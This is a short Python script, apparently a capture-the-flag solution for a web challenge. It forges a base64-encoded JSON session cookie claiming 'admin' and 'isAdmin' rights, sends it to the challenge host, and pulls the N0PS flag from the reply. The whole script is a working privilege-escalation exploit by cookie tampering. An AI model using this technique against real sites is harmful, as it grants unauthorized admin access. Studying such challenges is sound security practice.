#!/usr/bin/env python3
import base64
import json
import re
import requests

cookies = {
    'session': base64.b64encode(json.dumps({
        'username': 'admin',
        'isAdmin': '1'
    }).encode()).decode()
}

response = requests.get('https://nopsctf-web-cook.chals.io/', cookies=cookies)

print(re.search('N0PS{.+}', response.text).group(0))
